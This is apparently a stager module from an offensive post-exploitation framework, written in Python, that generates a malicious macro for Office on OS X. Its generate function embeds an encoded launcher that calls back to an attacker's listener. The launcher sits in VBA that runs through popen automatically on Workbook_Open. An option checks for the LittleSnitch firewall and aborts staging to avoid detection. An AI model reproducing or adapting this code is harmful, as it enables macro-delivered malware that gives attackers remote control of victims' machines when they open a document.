from lib.common import helpers
import re

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'AppleScript',

            'Author': ['@harmj0y'],

            'Description': ('An OSX office macro.'),

            'Comments': [
                "http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac"
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to output AppleScript to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'LittleSnitch' : {
                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    

    def generate(self):
        def formStr(varstr, instr):
             holder = []
             str1 = ''
             str2 = ''
             str1 = varstr + ' = "' + instr[:54] + '"' 
             for i in xrange(54, len(instr), 48):
                holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
                str2 = '"\r\n'.join(holder)
             
             str2 = str2 + "\""
             str1 = str1 + "\r\n"+str2
             return str1
        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        LittleSnitch = self.options['LittleSnitch']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent,  littlesnitch=LittleSnitch)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            launcher = launcher.replace("\"", "\"\"")
            # for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
            #     payload = formStr("cmd", match)

            macro = """
Option Explicit

#If VBA7 Then
Private Declare PtrSafe Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As LongPtr
#Else
Private Declare Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As Long
#End If

Private Sub Workbook_Open()
    Dim cmd As String
    #If VBA7 Then
    Dim result As LongPtr
    #Else
    Dim result As Long
    #End If
    result = popen("%s", "r")
End Sub
""" %(launcher)

            return macro
